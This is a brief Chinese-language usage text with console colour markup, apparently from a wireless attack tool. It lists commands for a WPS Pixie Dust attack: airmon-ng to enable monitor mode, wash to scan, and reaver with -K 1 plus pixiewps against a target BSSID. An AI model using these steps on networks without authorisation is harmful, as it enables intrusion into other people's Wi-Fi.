[bold cyan]使用方法:[/bold cyan]
 1. 将网卡设为监听模式: [yellow]airmon-ng start <iface>[/yellow]
 2. 扫描: [yellow]wash -i <mon-iface>[/yellow]
 3. 攻击: [yellow]reaver -i <mon-iface> -b <BSSID> -c <ch> -vvv -K 1 -f[/yellow]
 4. 运行: [yellow]pixiewps -h[/yellow]
